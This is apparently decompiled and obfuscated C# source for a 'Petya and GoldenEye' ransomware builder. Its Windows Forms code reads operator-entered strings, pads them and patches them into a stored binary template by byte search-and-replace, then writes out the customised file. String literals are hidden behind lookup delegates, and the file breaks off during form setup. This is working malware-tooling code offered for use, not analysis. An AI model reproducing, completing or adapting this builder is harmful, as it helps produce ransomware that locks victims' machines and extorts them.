using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using ns0;

namespace Petya_and_GoldenEye_BUILDER;

public class Form1 : Form
{
	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private IContainer icontainer_0;

	private Label label_0;

	private GroupBox groupBox_0;

	private Label label_1;

	private Label label_2;

	private Label label_3;

	private Label label_4;

	private Label label_5;

	private TextBox textBox_0;

	private TextBox textBox_1;

	private TextBox textBox_2;

	private TextBox textBox_3;

	private TextBox textBox_4;

	private Button button_0;

	private GroupBox groupBox_1;

	private Label label_6;

	private Label label_7;

	private Label label_8;

	private Label label_9;

	private Label label_10;

	private GroupBox groupBox_2;

	private GroupBox groupBox_3;

	private GroupBox groupBox_4;

	private CheckBox checkBox_0;

	private Label label_11;

	private Label label_12;

	private Label label_13;

	private Label label_14;

	private TextBox textBox_5;

	private TextBox textBox_6;

	private Label label_15;

	private Label label_16;

	private TextBox textBox_7;

	private Label label_17;

	public Form1()
	{
		method_14();
	}

	private void method_0(object sender, EventArgs e)
	{
		Delegate37.smethod_0(this);
	}

	public void ReplaceMethod()
	{
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_4)) < Delegate65.smethod_0(string_1))
		{
			string text = Delegate69.smethod_0(textBox_4);
			for (int i = Class3.smethod_0(0); i < Delegate65.smethod_0(string_1) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_4)); i += Class3.smethod_0(4))
			{
				text = Delegate22.smethod_0(text, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_4, text);
		}
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_2)) < Delegate65.smethod_0(string_3))
		{
			string text2 = Delegate69.smethod_0(textBox_2);
			for (int j = Class3.smethod_0(8); j < Delegate65.smethod_0(string_3) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_2)); j += Class3.smethod_0(12))
			{
				text2 = Delegate22.smethod_0(text2, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_2, text2);
		}
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_1)) < Delegate65.smethod_0(string_4))
		{
			string text3 = Delegate69.smethod_0(textBox_1);
			for (int k = Class3.smethod_0(16); k < Delegate65.smethod_0(string_4) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_1)); k += Class3.smethod_0(20))
			{
				text3 = Delegate22.smethod_0(text3, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_1, text3);
		}
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_0)) < Delegate65.smethod_0(string_5))
		{
			string text4 = Delegate69.smethod_0(textBox_0);
			for (int l = Class3.smethod_0(24); l < Delegate65.smethod_0(string_5) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_0)); l += Class3.smethod_0(28))
			{
				text4 = Delegate22.smethod_0(text4, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_0, text4);
		}
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_6)) < Delegate65.smethod_0(string_6))
		{
			string text5 = Delegate69.smethod_0(textBox_6);
			for (int m = Class3.smethod_0(32); m < Delegate65.smethod_0(string_6) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_6)); m += Class3.smethod_0(36))
			{
				text5 = Delegate22.smethod_0(text5, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_6, text5);
		}
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_5)) < Delegate65.smethod_0(string_7))
		{
			string text6 = Delegate69.smethod_0(textBox_5);
			for (int n = Class3.smethod_0(40); n < Delegate65.smethod_0(string_7) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_5)); n += Class3.smethod_0(44))
			{
				text6 = Delegate22.smethod_0(text6, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_5, text6);
		}
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_7)) < Delegate65.smethod_0(string_8))
		{
			string text7 = Delegate69.smethod_0(textBox_7);
			for (int num = Class3.smethod_0(48); num < Delegate65.smethod_0(string_8) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_7)); num += Class3.smethod_0(52))
			{
				text7 = Delegate22.smethod_0(text7, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_7, text7);
		}
		if (((Delegate65.smethod_0(Delegate69.smethod_0(textBox_3)) == Class3.smethod_0(56)) ? 1 : 0) == Class3.smethod_0(60))
		{
			string text8 = Delegate69.smethod_0(textBox_3);
			for (int num2 = Class3.smethod_0(64); num2 < Class3.smethod_0(72) - Delegate65.smethod_0(Delegate69.smethod_0(textBox_3)); num2 += Class3.smethod_0(68))
			{
				text8 = Delegate22.smethod_0(text8, Class4.smethod_0(1));
			}
			Delegate47.smethod_0(textBox_3, text8);
		}
		string object_ = Delegate69.smethod_0(textBox_3);
		string[] array = new string[Class3.smethod_0(76)];
		array[Class3.smethod_0(80)] = Delegate55.smethod_0();
		if (Delegate25.smethod_0(object_, array, (StringSplitOptions)Class3.smethod_0(84)).Length < Class3.smethod_0(88))
		{
			string text9 = Delegate69.smethod_0(textBox_3);
			int num3 = Class3.smethod_0(92);
			while (true)
			{
				int num4 = num3;
				int num5 = Class3.smethod_0(100);
				string object_2 = Delegate69.smethod_0(textBox_3);
				string[] array2 = new string[Class3.smethod_0(104)];
				array2[Class3.smethod_0(108)] = Delegate55.smethod_0();
				if (num4 >= num5 - Delegate25.smethod_0(object_2, array2, (StringSplitOptions)Class3.smethod_0(112)).Length)
				{
					break;
				}
				text9 = Delegate22.smethod_0(text9, Delegate55.smethod_0());
				num3 += Class3.smethod_0(96);
			}
			Delegate47.smethod_0(textBox_3, text9);
		}
		method_2(string_0, string_1, Delegate69.smethod_0(textBox_4));
		method_2(string_0, string_2, Delegate69.smethod_0(textBox_3));
		method_2(string_0, string_3, Delegate69.smethod_0(textBox_2));
		method_2(string_0, string_4, Delegate69.smethod_0(textBox_1));
		method_2(string_0, string_5, Delegate69.smethod_0(textBox_0));
		method_2(string_0, string_6, Delegate69.smethod_0(textBox_6));
		method_2(string_0, string_7, Delegate69.smethod_0(textBox_5));
		method_2(string_0, string_8, Delegate69.smethod_0(textBox_7));
		Delegate47.smethod_0(textBox_6, string_6);
		Delegate47.smethod_0(textBox_5, string_7);
		Delegate47.smethod_0(textBox_7, string_8);
		Delegate47.smethod_0(textBox_4, string_1);
		Delegate47.smethod_0(textBox_3, string_2);
		Delegate47.smethod_0(textBox_2, string_3);
		Delegate47.smethod_0(textBox_1, string_4);
		Delegate47.smethod_0(textBox_0, string_5);
	}

	private void method_1(object sender, EventArgs e)
	{
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		if (Delegate70.smethod_0(checkBox_0))
		{
			if (Delegate119.smethod_0(Delegate22.smethod_0(Delegate28.smethod_0(Delegate39.smethod_0()), Class4.smethod_0(4))))
			{
				Delegate30.smethod_0(Delegate22.smethod_0(Delegate28.smethod_0(Delegate39.smethod_0()), Class4.smethod_0(4)));
			}
			Delegate113.smethod_0(this);
			Delegate16.smethod_0(this);
			Delegate21.smethod_0(string_0, Delegate22.smethod_0(Delegate28.smethod_0(Delegate39.smethod_0()), Class4.smethod_0(4)));
			Delegate37.smethod_0(this);
			Delegate78.smethod_0(Delegate79.smethod_0(Class4.smethod_0(25), Delegate28.smethod_0(Delegate39.smethod_0()), Class4.smethod_0(4)), Class4.smethod_0(50), (MessageBoxButtons)Class3.smethod_0(116), (MessageBoxIcon)Class3.smethod_0(120));
		}
		else
		{
			Delegate78.smethod_0(Class4.smethod_0(73), Class4.smethod_0(134), (MessageBoxButtons)Class3.smethod_0(124), (MessageBoxIcon)Class3.smethod_0(128));
		}
	}

	private void method_2(string string_9, string string_10, string string_11)
	{
		byte[] array = Delegate107.smethod_0(string_9);
		byte[] array2 = Delegate63.smethod_0(Delegate54.smethod_0(), string_10);
		byte[] array3 = Delegate63.smethod_0(Delegate54.smethod_0(), string_11);
		int num = method_3(array, array2);
		if (num >= Class3.smethod_0(132))
		{
			byte[] array4 = new byte[array.Length + array3.Length - array2.Length];
			Delegate62.smethod_0(array, Class3.smethod_0(136), array4, Class3.smethod_0(140), num);
			Delegate62.smethod_0(array3, Class3.smethod_0(144), array4, num, array3.Length);
			Delegate62.smethod_0(array, num + array2.Length, array4, num + array3.Length, array.Length - num - array2.Length);
			Delegate33.smethod_0(string_9, array4);
		}
	}

	private int method_3(byte[] byte_0, byte[] byte_1)
	{
		int num = Class3.smethod_0(148);
		while (true)
		{
			if (num < byte_0.Length - byte_1.Length)
			{
				bool flag = (byte)Class3.smethod_0(152) != 0;
				for (int i = Class3.smethod_0(156); i < byte_1.Length; i += Class3.smethod_0(168))
				{
					if (((byte_0[num + i] == byte_1[i]) ? 1 : 0) == Class3.smethod_0(160))
					{
						flag = (byte)Class3.smethod_0(164) != 0;
						break;
					}
				}
				if (flag)
				{
					break;
				}
				num += Class3.smethod_0(172);
				continue;
			}
			return Class3.smethod_0(176);
		}
		return num;
	}

	public void InstallFiles()
	{
		Delegate33.smethod_0(Delegate22.smethod_0(Delegate15.smethod_0(), Class4.smethod_0(151)), Delegate3.smethod_0());
	}

	public void GetFilePaths()
	{
		string_0 = Delegate22.smethod_0(Delegate15.smethod_0(), Class4.smethod_0(151));
	}

	public void LoadOrig()
	{
		string_1 = Delegate69.smethod_0(textBox_4);
		string_2 = Delegate69.smethod_0(textBox_3);
		string_3 = Delegate69.smethod_0(textBox_2);
		string_4 = Delegate69.smethod_0(textBox_1);
		string_5 = Delegate69.smethod_0(textBox_0);
		string_6 = Delegate69.smethod_0(textBox_6);
		string_7 = Delegate69.smethod_0(textBox_5);
		string_8 = Delegate69.smethod_0(textBox_7);
	}

	private void method_4(object sender, EventArgs e)
	{
		Delegate96.smethod_0(this);
		Delegate113.smethod_0(this);
		Delegate6.smethod_0(this);
	}

	public void RemoveFiles()
	{
		Delegate30.smethod_0(Delegate22.smethod_0(Delegate15.smethod_0(), Class4.smethod_0(164)));
	}

	private void method_5(object sender, EventArgs e)
	{
		Delegate47.smethod_0(textBox_4, "");
	}

	private void method_6(object sender, EventArgs e)
	{
		Delegate47.smethod_0(label_10, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(textBox_4)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_4)) > Class3.smethod_0(180))
		{
			Delegate47.smethod_0(textBox_4, Delegate103.smethod_0(Delegate69.smethod_0(textBox_4), Delegate65.smethod_0(Delegate69.smethod_0(textBox_4)) - Class3.smethod_0(184)));
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		Delegate47.smethod_0(label_9, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(textBox_3)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_3)) > Class3.smethod_0(188))
		{
			Delegate47.smethod_0(textBox_3, Delegate103.smethod_0(Delegate69.smethod_0(textBox_3), Delegate65.smethod_0(Delegate69.smethod_0(textBox_3)) - Class3.smethod_0(192)));
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		Delegate47.smethod_0(label_8, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(textBox_2)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(textBox_2)) > Class3.smethod_0(196))
		{
			Delegate47.smethod_0(textBox_2, Delegate103.smethod_0(Delegate69.smethod_0(textBox_2), Delegate65.smethod_0(Delegate69.smethod_0(textBox_2)) - Class3.smethod_0(200)));
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		Label object_ = label_7;
		TextBox object_2 = textBox_1;
		Delegate47.smethod_0(object_, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(object_2)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(object_2)) > Class3.smethod_0(204))
		{
			Delegate47.smethod_0(object_2, Delegate103.smethod_0(Delegate69.smethod_0(object_2), Delegate65.smethod_0(Delegate69.smethod_0(object_2)) - Class3.smethod_0(208)));
		}
	}

	private void method_10(object sender, EventArgs e)
	{
		Label object_ = label_6;
		TextBox object_2 = textBox_0;
		Delegate47.smethod_0(object_, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(object_2)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(object_2)) > Class3.smethod_0(212))
		{
			Delegate47.smethod_0(object_2, Delegate103.smethod_0(Delegate69.smethod_0(object_2), Delegate65.smethod_0(Delegate69.smethod_0(object_2)) - Class3.smethod_0(216)));
		}
	}

	private void method_11(object sender, EventArgs e)
	{
		Label object_ = label_11;
		TextBox object_2 = textBox_6;
		Delegate47.smethod_0(object_, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(object_2)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(object_2)) > Class3.smethod_0(220))
		{
			Delegate47.smethod_0(object_2, Delegate103.smethod_0(Delegate69.smethod_0(object_2), Delegate65.smethod_0(Delegate69.smethod_0(object_2)) - Class3.smethod_0(224)));
		}
	}

	private void method_12(object sender, EventArgs e)
	{
		Label object_ = label_13;
		TextBox object_2 = textBox_5;
		Delegate47.smethod_0(object_, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(object_2)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(object_2)) > Class3.smethod_0(228))
		{
			Delegate47.smethod_0(object_2, Delegate103.smethod_0(Delegate69.smethod_0(object_2), Delegate65.smethod_0(Delegate69.smethod_0(object_2)) - Class3.smethod_0(232)));
		}
	}

	private void method_13(object sender, EventArgs e)
	{
		Label object_ = label_15;
		TextBox object_2 = textBox_7;
		Delegate47.smethod_0(object_, Delegate64.smethod_0(Delegate65.smethod_0(Delegate69.smethod_0(object_2)), Class4.smethod_0(177)));
		if (Delegate65.smethod_0(Delegate69.smethod_0(object_2)) > Class3.smethod_0(236))
		{
			Delegate47.smethod_0(object_2, Delegate103.smethod_0(Delegate69.smethod_0(object_2), Delegate65.smethod_0(Delegate69.smethod_0(object_2)) - Class3.smethod_0(240)));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if ((!disposing) ? ((byte)Class3.smethod_0(244) != 0) : (icontainer_0 != null))
		{
			Delegate14.smethod_0(icontainer_0);
		}
		Delegate7.smethod_0(this, disposing);
	}

	private void method_14()
	{
		//IL_1c7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c84: Expected O, but got Unknown
		ComponentResourceManager object_ = Delegate85.smethod_0(Delegate23.smethod_0(typeof(Form1).TypeHandle));
		label_0 = Delegate44.smethod_0();
		groupBox_0 = Delegate41.smethod_0();
		label_17 = Delegate44.smethod_0();
		label_15 = Delegate44.smethod_0();
		label_16 = Delegate44.smethod_0();
		textBox_7 = Delegate45.smethod_0();
		label_11 = Delegate44.smethod_0();
		label_12 = Delegate44.smethod_0();
		label_13 = Delegate44.smethod_0();
		label_14 = Delegate44.smethod_0();
		textBox_5 = Delegate45.smethod_0();
		textBox_6 = Delegate45.smethod_0();
		label_6 = Delegate44.smethod_0();
		label_7 = Delegate44.smethod_0();
		label_8 = Delegate44.smethod_0();
		label_9 = Delegate44.smethod_0();
		label_10 = Delegate44.smethod_0();
		label_1 = Delegate44.smethod_0();
		label_2 = Delegate44.smethod_0();
		label_3 = Delegate44.smethod_0();
		label_4 = Delegate44.smethod_0();
		label_5 = Delegate44.smethod_0();
		textBox_0 = Delegate45.smethod_0();
		textBox_1 = Delegate45.smethod_0();
		textBox_2 = Delegate45.smethod_0();
		textBox_3 = Delegate45.smethod_0();
		textBox_4 = Delegate45.smethod_0();
		button_0 = Delegate51.smethod_0();
		groupBox_1 = Delegate41.smethod_0();
		groupBox_2 = Delegate41.smethod_0();
		groupBox_3 = Delegate41.smethod_0();
		groupBox_4 = Delegate41.smethod_0();
		checkBox_0 = Delegate36.smethod_0();
		Delegate88.smethod_1(groupBox_0);
		Delegate88.smethod_0(this);
		Delegate68.smethod_0(label_0, (byte)Class3.smethod_0(248) != 0);
		Delegate43.smethod_0(label_0, Delegate11.smethod_0(Class4.smethod_0(184), Class3.smethod_2(252), (FontStyle)Class3.smethod_0(256), (GraphicsUnit)Class3.smethod_0(260), (byte)Class3.smethod_0(264)));
		Delegate40.smethod_0(label_0, Delegate8.smethod_0());
		Delegate66.smethod_0(label_0, new Point(Class3.smethod_0(268), Class3.smethod_0(272)));
		Delegate105.smethod_1(label_0, Class4.smethod_0(225));
		Delegate97.smethod_0(label_0, new Size(Class3.smethod_0(276), Class3.smethod_0(280)));
		Delegate20.smethod_0(label_0, Class3.smethod_0(284));
		Delegate47.smethod_0(label_0, Class4.smethod_0(238));
		Delegate90.smethod_0(groupBox_0, Delegate0.smethod_0());
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_17);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_15);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_16);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_7);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_11);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_12);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_13);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_14);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_5);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_6);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_6);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_7);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_8);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_9);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_10);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_1);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_2);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_3);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_4);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)label_5);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_0);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_1);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_2);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_3);
		Delegate38.smethod_0(Delegate82.smethod_1(groupBox_0), (Control)(object)textBox_4);
		Delegate40.smethod_0(groupBox_0, Delegate8.smethod_0());
		Delegate66.smethod_0(groupBox_0, new Point(Class3.smethod_0(288), Class3.smethod_0(292)));
		Delegate105.smethod_1(groupBox_0, Class4.smethod_0(327));
		Delegate97.smethod_0(groupBox_0, new Size(Class3.smethod_0(296), Class3.smethod_0(300)));
		Delegate20.smethod_0(groupBox_0, Class3.smethod_0(304));
		Delegate52.smethod_0(groupBox_0, (byte)Class3.smethod_0(308) != 0);
		Delegate47.smethod_0(groupBox_0, Class4.smethod_0(346));
		Delegate68.smethod_0(label_17, (byte)Class3.smethod_0(312) != 0);
		Delegate40.smethod_0(label_17, Delegate98.smethod_0());
		Delegate66.smethod_0(label_17, new Point(Class3.smethod_0(316), Class3.smethod_0(320)));
		Delegate105.smethod_1(label_17, Class4.smethod_0(385));
		Delegate97.smethod_0(label_17, new Size(Class3.smethod_0(324), Class3.smethod_0(328)));
		Delegate20.smethod_0(label_17, Class3.smethod_0(332));
		Delegate47.smethod_0(label_17, Class4.smethod_0(400));
		Delegate68.smethod_0(label_15, (byte)Class3.smethod_0(336) != 0);
		Delegate40.smethod_0(label_15, Delegate98.smethod_0());
		Delegate66.smethod_0(label_15, new Point(Class3.smethod_0(340), Class3.smethod_0(344)));
		Delegate105.smethod_1(label_15, Class4.smethod_0(431));
		Delegate97.smethod_0(label_15, new Size(Class3.smethod_0(348), Class3.smethod_0(352)));
		Delegate20.smethod_0(label_15, Class3.smethod_0(356));
		Delegate47.smethod_0(label_15, Class4.smethod_0(446));
		Delegate68.smethod_0(label_16, (byte)Class3.smethod_0(360) != 0);
		Delegate40.smethod_0(label_16, Delegate98.smethod_0());
		Delegate66.smethod_0(label_16, new Point(Class3.smethod_0(364), Class3.smethod_0(368)));
		Delegate105.smethod_1(label_16, Class4.smethod_0(459));
		Delegate97.smethod_0(label_16, new Size(Class3.smethod_0(372), Class3.smethod_0(376)));
		Delegate20.smethod_0(label_16, Class3.smethod_0(380));
		Delegate47.smethod_0(label_16, Class4.smethod_0(474));
		Delegate90.smethod_0(textBox_7, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_7, Delegate75.smethod_0(Class3.smethod_0(384), Class3.smethod_0(388), Class3.smethod_0(392)));
		Delegate66.smethod_0(textBox_7, new Point(Class3.smethod_0(396), Class3.smethod_0(400)));
		Delegate83.smethod_0(textBox_7, (byte)Class3.smethod_0(404) != 0);
		Delegate105.smethod_1(textBox_7, Class4.smethod_0(491));
		Delegate97.smethod_0(textBox_7, new Size(Class3.smethod_0(408), Class3.smethod_0(412)));
		Delegate20.smethod_0(textBox_7, Class3.smethod_0(416));
		Delegate47.smethod_0(textBox_7, Class4.smethod_0(508));
		Delegate46.smethod_0(textBox_7, method_13);
		Delegate68.smethod_0(label_11, (byte)Class3.smethod_0(420) != 0);
		Delegate40.smethod_0(label_11, Delegate98.smethod_0());
		Delegate66.smethod_0(label_11, new Point(Class3.smethod_0(424), Class3.smethod_0(428)));
		Delegate105.smethod_1(label_11, Class4.smethod_0(702));
		Delegate97.smethod_0(label_11, new Size(Class3.smethod_0(432), Class3.smethod_0(436)));
		Delegate20.smethod_0(label_11, Class3.smethod_0(440));
		Delegate47.smethod_0(label_11, Class4.smethod_0(446));
		Delegate68.smethod_0(label_12, (byte)Class3.smethod_0(444) != 0);
		Delegate40.smethod_0(label_12, Delegate98.smethod_0());
		Delegate66.smethod_0(label_12, new Point(Class3.smethod_0(448), Class3.smethod_0(452)));
		Delegate105.smethod_1(label_12, Class4.smethod_0(717));
		Delegate97.smethod_0(label_12, new Size(Class3.smethod_0(456), Class3.smethod_0(460)));
		Delegate20.smethod_0(label_12, Class3.smethod_0(464));
		Delegate47.smethod_0(label_12, Class4.smethod_0(732));
		Delegate68.smethod_0(label_13, (byte)Class3.smethod_0(468) != 0);
		Delegate40.smethod_0(label_13, Delegate98.smethod_0());
		Delegate66.smethod_0(label_13, new Point(Class3.smethod_0(472), Class3.smethod_0(476)));
		Delegate105.smethod_1(label_13, Class4.smethod_0(749));
		Delegate97.smethod_0(label_13, new Size(Class3.smethod_0(480), Class3.smethod_0(484)));
		Delegate20.smethod_0(label_13, Class3.smethod_0(488));
		Delegate47.smethod_0(label_13, Class4.smethod_0(446));
		Delegate68.smethod_0(label_14, (byte)Class3.smethod_0(492) != 0);
		Delegate40.smethod_0(label_14, Delegate98.smethod_0());
		Delegate66.smethod_0(label_14, new Point(Class3.smethod_0(496), Class3.smethod_0(500)));
		Delegate105.smethod_1(label_14, Class4.smethod_0(762));
		Delegate97.smethod_0(label_14, new Size(Class3.smethod_0(504), Class3.smethod_0(508)));
		Delegate20.smethod_0(label_14, Class3.smethod_0(512));
		Delegate47.smethod_0(label_14, Class4.smethod_0(777));
		Delegate90.smethod_0(textBox_5, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_5, Delegate75.smethod_0(Class3.smethod_0(516), Class3.smethod_0(520), Class3.smethod_0(524)));
		Delegate66.smethod_0(textBox_5, new Point(Class3.smethod_0(528), Class3.smethod_0(532)));
		Delegate105.smethod_1(textBox_5, Class4.smethod_0(794));
		Delegate97.smethod_0(textBox_5, new Size(Class3.smethod_0(536), Class3.smethod_0(540)));
		Delegate20.smethod_0(textBox_5, Class3.smethod_0(544));
		Delegate47.smethod_0(textBox_5, Class4.smethod_0(811));
		Delegate46.smethod_0(textBox_5, method_12);
		Delegate90.smethod_0(textBox_6, Delegate0.smethod_0());
		Delegate40.smethod_0(textBox_6, Delegate75.smethod_0(Class3.smethod_0(548), Class3.smethod_0(552), Class3.smethod_0(556)));
		Delegate66.smethod_0(textBox_6, new Point(Class3.smethod_0(560), Class3.smethod_0(564)));
		Delegate105.smethod_1(textBox_6, Class4.smethod_0(884));
		Delegate97.smethod_0(textBox_6, new Size(Class3.smethod_0(568), Class3.smethod_0(572)));
		Delegate20.smethod_0(textBox_6, Class3.smethod_0(576));
		Delegate47.smethod_0(textBox_6, Class4.smethod_0(901));
		Delegate46.smethod_0(textBox_6, method_11);
		Delegate68.smethod_0(label_6, (byte)Class3.smethod_0(580) != 0);
		Delegate40.smethod_0(label_6, Delegate98.smethod_0());
		Delegate66.smethod_0(label_6, new Point(Class3.smethod_0(584), Class3.smethod_0(588)));
		Delegate105.smethod_1(label_6, Class4.smethod_0(974));
		Delegate97.smethod_0(label_6, new Size(Class3.smethod_0(592), Class3.smethod_0(596)));
		Delegate20.smethod_0(label_6, Class3.smethod_0(600));
		Delegate47.smethod_0(label_6, Class4.smethod_0(446));
		Delegate68.smethod_0(label_7, (byte)Class3.smethod_0(604) != 0);
		Delegate40.smethod_0(label_7, Delegate98.smethod_0());
		Delegate66.smethod_0(label_7, new Point(Class3.smethod_0(608), Class3.smethod_0(612)));
		Delegate105.smethod_1(label_7, Class4.smethod_0(987));
		Delegate97.smethod_0(label_7, new Size(Class3.smethod_0(616), Class3.smethod_0(620)));
		Delegate20.smethod_0(label_7, Class3.smethod_0(624));
		Delegate47.smethod_0(label_7, Class4.smethod_0(446));
		Delegate68.smethod_0(label_8, (byte)Class3.smethod_0(628) != 0);
		Delegate40.smethod_0(label_8, Delegate98.smethod_0());
		Delegate66.smethod_0(label_8, new Point(Class3.smethod_0(632), Class3.smethod_0(636)));
		Delegate105.smethod_1(label_8, Class4.smethod_0(1000));
		Delegate97.smethod_0(label_8, new Size(Class3.smethod_0(640), Class3.smethod_0(644)));
		Delegate20.smethod_0(label_8, Class3.smethod_0(648));
		Delegate47.smethod_0(label_8, Class4.smethod_0(446));
		Delegate68.smethod_0(label_9, (byte)Class3.smethod_0(652) != 0);
		Delegate40.smethod_0(label_9, Delegate98.smethod_0());
		Delegate66.smethod_0(label_9, new Point(Class3.smethod_0(656), Class3.smethod_0(660)));
		Delegate105.smethod_1(label_9, Class4.smethod_0(1013));
		Delegate97.smethod_0(label_9, new Size(Class3.smethod_0(664), Class3.smethod_0(668)));
		Delegate20.smethod_0(label_9, Class3.smethod_0(672));
		Delegate47.smethod_0(label_9, Class4.smethod_0(446));
		Delegate68.smethod_0(label_10, (byte)Class3.smethod_0(676) != 0);
		Delegate40.smethod_0(label_10, Delegate98.smethod_0());
		Delegate66.smethod_0(label_10, new Point(Class3.smethod_0(680), Class3.smethod_0(684)));
		Delegate105.smethod_1(label_10, Class4.smethod_0(1026));
		Delegate97.smethod_0(label_10, new Size(Class3.smethod_0(688), Class3.smethod_0(692)));
		Delegate20.smethod_0(label_10, Class3.smethod_0(696));
		Delegate47.smethod_0(label_10, Class4.smethod_0(446));
		Delegate68.smethod_0(label_1, (byte)Class3.smethod_0(700) != 0);
		Delegate40.smethod_0(label_1, Delegate98.smethod_0());
		Delegate66.smethod_0(label_1, new Point(Class3.smethod_0(704), Class3.smethod_0(708)));
		Delegate105.smethod_1(label_1, Class4.smethod_0(1039));
		Delegate97.smethod_0(label_1, new Size(Class3.smethod_0(712), Class3.smethod_0(716)));
		Delegate20.smethod_0(label_1, Class3.smethod_0(720));
		Delegate47.smethod_0(label_1, Class4.smethod_0(1054));
		Delegate68.smethod_0(label_2, (byte)Class3.smethod_0(724) != 0);
		Delegate40.smethod_0(label_2, Delegate98.smethod_0());
		Delegate66.smethod_0(label_2, new Point(Class3.smethod_0(728), Class3.smethod_0(732)));
		Delegate105.smethod_1(label_2, Class4.smethod_0(1071));
		Delegate97.smethod_0(label_2, new Size(Class3.smethod_0(736), Class3.smethod_0(740)));
		Delegate20.smethod_0(label_2, Class3.smethod_0(744));
		Delegate47.smethod_0(label_2, Class4.smethod_0(1086));
		Delegate68.smethod_0(label_3, (byte)Class3.smethod_0(748) != 0);
		Delegate40.smethod_0(label_3, Delegate98.smethod_0());
		Delegate66.smethod_0(label_3, new Point(Class3.smethod_0(752), Class3.smethod_0(756)));
		Delegate105.smethod_1(label_3, Class4.smethod_0(1103));
		Delegate97.smethod_0(label_3, new Size(Class3.smethod_0(760), Class3.smethod_0(764)));
		Delegate20.smethod_0(label_3, Class3.smethod_0(768));
		Delegate47.smethod_0(label_3, Class4.smethod_0(1118));
		Delegate68.smethod_0(label_4, (byte)Class3.smethod_0(772) != 0);
		Delegate40.smethod_0(label_4, Delegate98.smethod_0());
		Delegate66.smethod_0(label_4, new Point(Class3.smethod_0(776), Class3.smethod_0(780)));
		Delegate105.smethod_1(label_4, Class4.smethod_0(1135));
		Delegate97.smethod_0(label_4, new Size(Class3.smethod_0(784), Class3.smethod_0(788)));
		Delegate20.smethod_0(label_4, Class3.smethod_0(792));
		Delegate47.smethod_0(label_4, Class4.smethod_0(1148));
